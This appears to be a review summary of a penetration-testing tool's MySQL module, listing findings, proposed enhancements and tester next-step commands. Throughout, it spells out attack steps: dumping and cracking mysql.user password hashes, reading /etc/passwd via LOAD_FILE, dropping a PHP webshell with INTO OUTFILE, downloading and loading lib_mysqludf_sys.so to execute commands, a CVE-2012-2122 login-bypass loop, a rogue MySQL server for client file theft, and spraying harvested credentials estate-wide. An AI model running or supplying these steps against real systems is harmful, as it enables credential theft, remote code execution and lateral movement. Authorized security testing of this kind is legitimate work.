summary: Mature module (866 LOC) — native MySQL protocol handshake, empty-password / anonymous root probe with full AuthSwitch and caching_sha2 negotiation, native_password credentialed authenticate(), server_version + CLIENT_SSL parsing, mysql.user hash dump, FILE-priv/plugin_dir/secure_file_priv/local_infile recon, loaded UDF (mysql.func) detection, information_schema-driven datamine with redacted samples + connection-string harvest, banner-driven CVE correlation (three CVEs, MySQL + MariaDB). Biggest gap: no active file-read proof via LOAD_FILE (would upgrade file_priv to T2); UDF-load-and-execute chain (writing lib_mysqludf_sys.so via SELECT INTO DUMPFILE) is left to the operator; no credential-spray on failed auth beyond the supplied engagement creds.

findings.tier_evidence: _login_empty successfully runs HandshakeResponse41 with zero-length auth response + follows AuthSwitch/caching_sha2 MoreData; only fires on 0x00 OK packet. Then loot() actually queries mysql.user and pulls hashes — proof of access + read.
findings.promotion_notes: Wire the socket returned from _login into an interactive shell handoff (subprocess into the mysql client with -p '' inherited env or connect via mysql_binary), storing the persistent connection handle in the session for follow-up ops.
findings.tester_next_step: mysql -h <ip> -P <port> -u root -e 'SELECT user,host,authentication_string FROM mysql.user'; hashcat -m 300 hashes.txt rockyou.txt.

findings.tier_evidence: authenticate() with real native_password scramble against greeting salt — landed cred is proven by 0x00 OK. loot() then dumps mysql.user + FILE-priv state under that identity.
findings.promotion_notes: Same as empty-pw: bind an interactive shell + auto-drop a webshell via INTO OUTFILE if FILE priv held and secure_file_priv permits.
findings.tester_next_step: mysql -h <ip> -P <port> -u <user> -p; then \u mysql; SELECT * FROM user; check GRANTS for FILE/SUPER; if FILE, LOAD_FILE('/etc/passwd') and SELECT ... INTO OUTFILE '/var/www/html/s.php'.

findings.title_pattern: MySQL server allows LOAD DATA LOCAL (client-file read chain)
findings.tier_evidence: SELECT @@local_infile returns 1 / ON — deterministic server config assertion.
findings.promotion_notes: Bundle a tiny rogue-mysql-server shim (accept the greeting, send a Local Infile request with a chosen filename) and demonstrate the chain by having recce reconnect to itself as a client — proof the primitive works, without needing a real app SQLi.
findings.tester_next_step: python3 rogue-mysql-server.py -f /etc/passwd; then coerce any client (SQLi in app that uses this DB) to connect with local_infile=1; captured file lands in your rogue server output.

findings.title_pattern: MySQL FILE privilege (arbitrary file read/write -> RCE)
findings.tier_evidence: SHOW GRANTS parsed for FILE / ALL PRIVILEGES ON *.* + @@secure_file_priv + @@plugin_dir — deterministic proof of held privilege. Actual file read/write is not attempted.
findings.promotion_notes: Actually execute SELECT LOAD_FILE('/etc/hosts') (universally-present canary) and attach first 64 bytes as proof — mirrors mssql_openrowset_read pattern already in the mssql module.
findings.tester_next_step: mysql -h <ip> -P <port> -u <u> -p -e "SELECT LOAD_FILE('/etc/passwd')"; if secure_file_priv empty + plugin_dir writable, wget lib_mysqludf_sys.so, SELECT ... INTO DUMPFILE '<plugin_dir>/l.so', CREATE FUNCTION sys_exec RETURNS INT SONAME 'l.so'; SELECT sys_exec('id').

findings.title_pattern: MySQL sensitive data exposed (PII / secrets / credentials)
findings.tier_evidence: datamine() actually SELECTs matching sensitive columns and returns redacted samples + regex-harvested connection strings — real data is exfiltrated (redacted) and creds are stored in looted list.
findings.promotion_notes: Feed harvested embedded connection strings back into recce's credential spray across every mysql/postgres/http target — turns one DB's stored creds into estate-wide access.
findings.tester_next_step: mysql -h <ip> -P <port> -u <u> -p -e 'SELECT * FROM <db>.<table> LIMIT 20'; sanitize + reuse embedded creds against every discovered service.

findings.title_pattern: MySQL command-execution UDF already loaded (instant RCE)
findings.tier_evidence: SELECT name,dl FROM mysql.func matched against _UDF_RCE_NAMES / 'mysqludf_sys' — deterministic proof of RCE primitive presence. Does not invoke sys_eval to confirm output.
findings.promotion_notes: SELECT sys_eval('id') under the current session and capture the returned bytes as proof — turns capability into confirmed foothold.
findings.tester_next_step: mysql -h <ip> -P <port> -u <u> -p -e "SELECT sys_eval('id')"; then whoami + hostname; check for docker / suid on the mysqld process for host escape.

findings.tier_evidence: SELECT name,dl FROM mysql.func returned non-RCE-named UDFs — enumeration of a privesc surface without any exploit proof.
findings.promotion_notes: Read the backing .so name and match against a shipped catalogue of known-vulnerable UDFs; upgrade severity when the library name resolves to something exploitable.
findings.tester_next_step: mysql> SELECT name,dl FROM mysql.func; ldd on the .so on the DB host; grep for exec/system/popen — otherwise treat as informational.

findings.tier_evidence: Banner-driven version comparison against 5.1.61/5.5.22/5.6.5 ceilings within the same major.minor train — a banner assertion, no attempt to exercise the memcmp() bypass.
findings.promotion_notes: Actually run the CVE-2012-2122 exploit loop: for i in {1..300}; do mysql -u root -pWRONG -h <ip>; done — a landed login proves vulnerable glibc build.
findings.tester_next_step: for i in $(seq 1 500); do mysql -u root -h <ip> --password=WRONG -e 'SELECT 1' 2>/dev/null && echo HIT && break; done. If HIT, dump mysql.user hashes.

findings.tier_evidence: Banner-driven version check only; no confirmation the mysqld_safe wrapper is in use or that log-config is writable.
findings.promotion_notes: When FILE priv is also held, actually write a malicious my.cnf under $DATADIR and check ownership/perms — proves prerequisites for the escalation.
findings.tester_next_step: With FILE priv: SET GLOBAL general_log_file='/var/lib/mysql/my.cnf'; SET GLOBAL general_log=1; INSERT trigger crafted [malloc_lib] block; check /proc for mysqld_safe.

findings.tier_evidence: Banner match only — post-auth DoS, banner insufficient to guarantee exploitability.
findings.promotion_notes: DoS PoCs are destructive; leave at banner-tier. Only promote if the operator asks with explicit ROE.
findings.tester_next_step: Do NOT auto-run. Consult Oracle CPU April 2021 advisory + MySQL 5.7.34/8.0.23 changelog for the partitioning DML PoC.

findings.title_pattern: MySQL does not offer TLS (credential sniffing)
findings.tier_evidence: Server greeting parsed — CLIENT_SSL flag absent from cap bytes. Deterministic server-side assertion.
findings.promotion_notes: Verification would require actually sniffing a live auth — out of scope.
findings.tester_next_step: On-path sniff of native_password scramble; capture with tcpdump + mysql_scramble cracker (hashcat -m 11200).
